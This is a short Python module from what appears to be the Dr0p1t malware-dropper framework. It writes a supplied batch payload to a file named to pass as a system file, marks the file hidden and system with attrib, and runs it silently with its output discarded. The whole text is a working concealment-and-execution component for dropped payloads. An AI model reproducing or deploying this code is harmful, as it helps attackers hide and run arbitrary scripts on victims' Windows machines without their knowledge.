#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This module aims to run batchfile scripts (bat)
#Start
from os import popen
def create_and_run_bat(tobe):
    f = open("System_desktop.bat","w")
    f.write(tobe)
    f.close()
    xxx = popen("attrib +s +h System_desktop.bat")
    blah = popen( "System_desktop.bat > nul" )

create_and_run_bat(Bat_Script_Data)
